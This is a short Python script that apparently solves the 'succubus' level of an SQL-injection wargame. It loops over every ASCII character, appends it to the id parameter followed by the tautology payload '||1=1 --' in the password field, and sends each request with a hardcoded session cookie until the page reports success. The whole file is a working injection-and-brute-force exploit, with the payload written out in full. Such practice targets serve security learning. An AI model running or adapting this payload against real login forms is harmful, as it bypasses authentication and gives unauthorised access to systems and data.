import requests
import urllib.parse

url = "https://los.rubiya.kr/chall/succubus_37568a99f12e6bd2f097e8038f74d768.php/?id="
add_url = ""
rq = ""

for i in range (0,127):
    add_url="{}&pw= ||1=1 -- ;".format(chr(i))
    new_url = str(url+urllib.parse.quote(add_url))
    rq = requests.get(new_url, cookies={"PHPSESSID": "q226co20d7ao5bn7lv968urorp"})
    if str(rq.text).find("SUCCUBUS Clear!") != -1:
        print(hex(i)+"   "+chr(i))
print("===Done===")